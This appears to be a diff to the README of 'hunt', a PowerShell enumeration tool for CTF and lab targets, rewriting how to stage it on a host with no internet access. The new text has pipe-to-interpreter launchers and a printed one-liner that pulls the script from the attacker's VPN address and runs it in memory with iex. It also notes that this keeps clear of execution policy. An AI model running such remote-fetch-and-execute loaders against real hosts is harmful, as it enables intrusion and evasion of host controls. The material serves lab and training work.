@@ -70,6 +70,10 @@ The `iex` form is the one to reach for on a locked-down host: dot-sourcing a
 *"running scripts is disabled on this system"*, while `iex` of a string is not.
 Nothing touches disk either way.
 
+On an isolated target that cannot reach GitHub at all — most CTF and lab boxes
+— stage it from your own machine instead. See
+[On a box with no internet](#on-a-box-with-no-internet) just below.
+
 ### On a box with no internet
 
 Which is most of them. A CTF or lab target usually has no egress at all, so
@@ -79,27 +83,67 @@ Which is most of them. A CTF or lab target usually has no egress at all, so
 irm : The remote name could not be resolved: 'raw.githubusercontent.com'
 ```
 
-That is DNS, not the tool. Serve the file from your own machine instead — the
-target can reach you over the VPN even when it cannot reach the internet:
+That is DNS, not the tool. The target cannot reach GitHub, but it can reach
+*you* over the VPN. Run one command on your own machine to stage it, then paste
+the one line it prints into the target.
+
+The launcher depends on your attacking box's shell — the command you paste into
+the target is the same either way.
+
+**On a Linux box (Pwnbox, Kali):**
 
 ```bash
-# on your box
-cd hunt && python3 -m http.server 8000
+curl -sL https://raw.githubusercontent.com/iamjoshgilman/hunt/main/serve.py | python3 -
 ```
+
+**On a Windows or PowerShell box:**
 
 ```powershell
-# on the target, where 10.10.14.X is your VPN address
-curl.exe -s -o C:\Windows\Temp\hunt.ps1 http://10.10.14.X:8000/hunt.ps1
-(Get-Item C:\Windows\Temp\hunt.ps1).Length     # compare against the real size
-iex (Get-Content C:\Windows\Temp\hunt.ps1 -Raw)
+& ([scriptblock]::Create((irm https://raw.githubusercontent.com/iamjoshgilman/hunt/main/install.ps1))) -Remote
 ```
 
-Download first and check the length rather than piping straight into `iex`.
-`python3 -m http.server` truncates large files to Windows clients at a
-different byte count each time, and a half-delivered script fails as a parse
-error somewhere in the middle of the catalogue rather than as a transfer
-problem. `impacket-smbserver share . -smb2support` and a plain `copy` does not
-have that failure mode.
+Either one prints:
+
+```
+  hunt staging server
+
+  pulled     hunt.ps1  78,216 bytes  (from github)
+  saved      /tmp/hunt.ps1
+  serving    http://10.10.14.5:8000/hunt.ps1  [tun0]
+  clipboard  copied with xclip
+
+  copy this to the target:
+
+  $b=(New-Object Net.WebClient).DownloadData('http://10.10.14.5:8000/hunt.ps1');if($b.Length -eq 78216){iex([Text.Encoding]::UTF8.GetString($b));hunt}else{"TRUNCATED $($b.Length)/78216"}
+
+  waiting for the target to pull it ... ctrl-c to stop
+```
+
+It fetches hunt.ps1, picks your VPN address, serves it, copies that command to
+your clipboard, and tells you when the target pulls it. Paste the command into
+the target's shell — RDP, a reverse shell, Evil-WinRM, wherever you are — and
+`hunt` is loaded. The target reaches back to you, so nothing on it needs
+internet.
+
+The command it prints is doing three things worth knowing about:
+
+- **It checks the byte count before running anything.** A truncated transfer
+  reports `TRUNCATED 41203/78216` rather than failing as a parse error
+  somewhere in the middle of the catalogue — which is how `python3 -m
+  http.server` fails, truncating large files to Windows clients at a different
+  count each time. The staging server sends a correct `Content-Length` and the
+  target verifies it; re-run the paste if it ever reports short.
+- **Nothing touches the target's disk.** It runs from memory, which also keeps
+  it clear of execution policy — that applies to running a `.ps1` file, not to
+  `iex` of a string.
+- **The server hands out one path.** It serves `/hunt.ps1` and 404s everything
+  else, rather than exposing a whole directory to the target.
+
+Flags, same idea on both launchers: `--ip` / `-Ip` when it guesses the wrong
+interface, `--port` / `-Port`, `--once` / (ctrl-c) to stop after the first
+pull, `--file` / `-Source` to stage a local copy when your own box is offline
+too, and `--curl` / `-Curl` for a `curl.exe` target command instead of
+`Net.WebClient`.
 
 If a box *does* have egress and `irm` still fails, Windows PowerShell 5.1
 negotiates TLS 1.0 by default and GitHub refuses it:
